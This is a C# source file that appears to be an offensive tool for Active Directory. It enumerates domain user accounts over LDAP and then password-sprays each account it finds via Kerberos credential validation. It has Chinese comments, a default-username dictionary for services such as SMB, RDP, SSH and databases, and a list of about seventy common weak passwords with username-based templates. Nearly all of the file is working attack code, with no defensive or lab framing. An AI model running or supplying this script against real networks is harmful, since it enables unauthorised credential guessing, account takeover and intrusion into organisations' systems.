using System;
using System.Collections.Generic;
using System.DirectoryServices.AccountManagement;
using System.Security.Authentication;


//用户名枚举：通过 PrincipalContext 和 PrincipalSearcher 实现的用户查询操作主要使用 LDAP 端口 389。
//密码喷射：PrincipalContext.ValidateCredentials 方法会触发 Kerberos 认证流程，主要使用 Kerberos 端口 88。


namespace KerberosUserEnumerationAndPasswordSpraying
{
    class Program
    {
        public static Dictionary<string, List<string>> UserDictionary = new Dictionary<string, List<string>>
        {
            { "ftp", new List<string> { "ftp", "admin", "ftpuser", "www", "web", "root", "db", "wwwroot", "data",  } },
            { "mysql", new List<string> { "root", "mysql" } },
            { "mssql", new List<string> { "sa", "sql" } },
            { "smb", new List<string> { "administrator", "jerry", "guest", "mary","jack" } },
            { "rdp", new List<string> { "administrator", "admin", "guest" ,"Lenovo"} },
            { "postgresql", new List<string> { "postgres", "admin" } },
            { "ssh", new List<string> { "root", "admin" } },
            { "mongodb", new List<string> { "root", "admin" } },
            { "oracle", new List<string> { "sys", "system", "admin", "test", "web", "orcl" } }
        };

        public static List<string> Passwords = new List<string>
        {

            "123456", "admin", "admin123", "root", "", "pass123", "pass@123", "password", "123123", "654321",
            "111111", "123", "1", "admin@123", "Admin@123", "admin123!@#", "{user}", "{user}1", "{user}111",
            "{user}123", "{user}@123", "{user}_123", "{user}#123", "{user}@111", "{user}@2019", "{user}@123#4",
            "P@ssw0rd!", "P@ssw0rd", "Passw0rd", "qwe123", "12345678", "test", "test123", "123qwe", "123qwe!@#",
            "123456789", "123321", "666666", "a123456.", "123456~a", "123456!a", "000000", "1234567890", "8888888","abc123$%","admin!@#456",
            "!QAZ2wsx", "1qaz2wsx", "abc123", "abc123456", "1qaz@WSX", "a11111", "a12345", "Aa1234", "Aa1234.",
            "Aa12345", "a123456", "a123123", "Aa123123", "Aa123456", "Aa12345.", "sysadmin", "system", "1qaz!QAZ","Admin12345",
            "2wsx@WSX", "qwe123!@#", "Aa123456!", "A123456s!", "sa123456", "1q2w3e", "Charge123", "Aa123456789","a","admin!@#45","abc123$%"
        };
        static void Main(string[] args)
        {
            string domainName = args[0]; // 替换为你的域名
            string[] userNames = { "Administrator", "Guest", "User1", "User2" }; // 要枚举的用户名列表
            string[] passwords = { "Password123", "Welcome1", "Password1" }; // 要尝试的密码列表

            foreach (var userName in UserDictionary["smb"])
            {
                bool userExists = CheckUserExists(domainName, userName);
                Console.WriteLine($"Username: {userName}, Exists: {userExists}");

                if (userExists)
                {
                    foreach (var password in Passwords)
                    {
                        bool passwordValid = AttemptLogin(domainName, userName, password);
                        if (passwordValid)
                        {
                            Console.WriteLine($"Attempting password: {password}, Success: {passwordValid}");
                        }
                        ;
                    }
                }
            }
        }

        static bool CheckUserExists(string domainName, string userName)
        {
            try
            {
                using (PrincipalContext context = new PrincipalContext(ContextType.Domain, domainName))
                {
                    using (UserPrincipal user = new UserPrincipal(context))
                    {
                        user.SamAccountName = userName;
                        using (PrincipalSearcher searcher = new PrincipalSearcher(user))
                        {
                            return searcher.FindOne() != null;
                        }
                    }
                }
            }
            catch (AuthenticationException ex)
            {
                if (ex.Message.Contains("The specified user does not exist") ||
                    ex.Message.Contains("unknown user name or bad password"))
                {
                    return false;
                }
                else
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
                return false;
            }
        }

        static bool AttemptLogin(string domainName, string userName, string password)
        {
            try
            {
                using (PrincipalContext context = new PrincipalContext(ContextType.Domain, domainName))
                {
                    return context.ValidateCredentials(userName, password);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred during login attempt: {ex.Message}");
                return false;
            }
        }
    }
}
